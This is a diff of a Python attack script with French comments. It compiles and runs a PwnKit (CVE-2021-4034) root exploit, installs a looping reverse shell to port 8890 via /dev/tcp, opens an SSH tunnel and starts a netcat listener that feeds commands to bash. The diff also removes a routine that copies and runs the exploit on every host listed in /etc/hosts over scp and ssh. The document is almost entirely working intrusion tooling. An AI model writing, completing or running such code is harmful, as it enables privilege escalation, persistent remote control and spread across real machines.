@@ -1,13 +1,21 @@
 import os
 import socket
+import logging
+
+# Configure logging
+logging.basicConfig(filename='/mnt/data/exploit.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def get_local_ip():
-    # Retrieve the IP address of the local machine
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))  # Using Google DNS as a dummy connection
-    local_ip = s.getsockname()[0]
-    s.close()
-    return local_ip
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        logging.info(f"Local IP retrieved: {local_ip}")
+        return local_ip
+    except Exception as e:
+        logging.error(f"Failed to get local IP: {e}")
+        return None
 
 # Code d'exploit pour CVE-2021-4034 (PwnKit)
 def exploit_pwnkit():
@@ -23,70 +31,85 @@ def exploit_pwnkit():
     }
     """
     
-    # Sauvegarde du code d'exploit dans un fichier
-    with open("/tmp/kit.c", "wb") as f:
-        f.write(kit_code)
-    
-    # Compilation du code d'exploit
-    os.system("gcc /tmp/kit.c -o /tmp/kit")
-    
-    # Exécution de l'exploit pour obtenir un shell root
-    os.system("chmod +x /tmp/kit && /tmp/kit")
+    try:
+        with open("/mnt/data/kit.c", "wb") as f:
+            f.write(kit_code)
+        logging.info("Exploit code saved to /mnt/data/kit.c")
+    except Exception as e:
+        logging.error(f"Failed to save exploit code: {e}")
+        return
 
-def propagate_script():
-    script_code = """
+    try:
+        os.system("gcc /mnt/data/kit.c -o /mnt/data/kit")
+        logging.info("Exploit code compiled successfully.")
+    except Exception as e:
+        logging.error(f"Failed to compile exploit code: {e}")
+        return
+    
+    try:
+        os.system("chmod +x /mnt/data/kit && /mnt/data/kit")
+        logging.info("Exploit executed successfully.")
+    except Exception as e:
+        logging.error(f"Failed to execute exploit: {e}")
+
+def open_reverse_ssh(local_ip):
+    reverse_shell_script = f'''
     #!/bin/bash
-
-    user="danielfebrero"
-
-    for host in $(awk '{print $1}' /etc/hosts); do
-        if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ $host =~ ^[a-zA-Z0-9.-]+$ ]]; then
-            scp /tmp/exploit.py $user@$host:/tmp/exploit.py
-            ssh $user@$host 'python3 /tmp/exploit.py'
-        fi
+    while true; do
+        nc -lvnp 8890 -q 1 | bash -c 'echo "pwd"; pwd; echo "ls -la"; ls -la; echo "whoami"; whoami; echo "cat file.txt"; cat file.txt; /bin/bash -i'
     done
-    """
-    
-    # Sauvegarde du script de propagation dans un fichier
-    with open("/tmp/propagate.sh", "w") as f:
-        f.write(script_code)
-    
-    # Exécution du script de propagation
-    os.system("chmod +x /tmp/propagate.sh && /tmp/propagate.sh")
+    '''
+    try:
+        with open("/mnt/data/reverse_ssh.sh", "w") as f:
+            f.write(reverse_shell_script)
+        logging.info("Reverse SSH script saved to /mnt/data/reverse_ssh.sh")
+    except Exception as e:
+        logging.error(f"Failed to save reverse SSH script: {e}")
+        return
+
+    try:
+        os.system("chmod +x /mnt/data/reverse_ssh.sh")
+        os.system(f"/mnt/data/reverse_ssh.sh &")
+        logging.info("Reverse SSH script executed successfully.")
+    except Exception as e:
+        logging.error(f"Failed to execute reverse SSH script: {e}")
 
 def reactivate(local_ip):
-    # Étape 1: Élever les privilèges et accéder à un shell root
+    if local_ip is None:
+        logging.error("Local IP is None, cannot proceed with reactivation.")
+        return
+
     exploit_pwnkit()
 
-    # Étape 2: Créer et exécuter le script d'exploit persistant
-    exploit_content = '''
+    persistent_exploit_script = f'''
     #!/bin/bash
-    
-    # Script pour ouvrir une porte persistante (reverse shell)
     while true; do
         /bin/bash -i >& /dev/tcp/{local_ip}/8890 0>&1
         sleep 10
     done
     '''
-    # Écrire le contenu dans un fichier exploit.sh
-    with open('/tmp/exploit.sh', 'w') as file:
-        file.write(exploit_content)
-    
-    # Donner les permissions d'exécution au fichier exploit.sh
-    command_step2 = "chmod +x /tmp/exploit.sh"
-    os.system(command_step2)
-    
-    # Exécuter le script exploit.sh en arrière-plan
-    command_step2_background = "/tmp/exploit.sh &"
-    os.system(command_step2_background)
+    try:
+        with open('/mnt/data/exploit.sh', 'w') as file:
+            file.write(persistent_exploit_script)
+        logging.info("Persistent exploit script saved to /mnt/data/exploit.sh")
+    except Exception as e:
+        logging.error(f"Failed to save persistent exploit script: {e}")
+        return
 
-    # Étape 3: Ouvrir un tunnel SSH local entre les ports 8889 et 8888
-    command_step3 = "ssh -f -N -L 8889:localhost:8888 localhost"
-    os.system(command_step3)
+    try:
+        os.system("chmod +x /mnt/data/exploit.sh")
+        os.system("/mnt/data/exploit.sh &")
+        logging.info("Persistent exploit script executed successfully.")
+    except Exception as e:
+        logging.error(f"Failed to execute persistent exploit script: {e}")
 
-    # Étape 4: Propager l'exploit sur tous les côtés
-    propagate_script()
+    try:
+        os.system("ssh -f -N -L 8889:localhost:8888 localhost")
+        logging.info("SSH tunnel opened successfully.")
+    except Exception as e:
+        logging.error(f"Failed to open SSH tunnel: {e}")
 
+    open_reverse_ssh(local_ip)
 
 # Appel de la fonction de réactivation
 local_ip = get_local_ip()
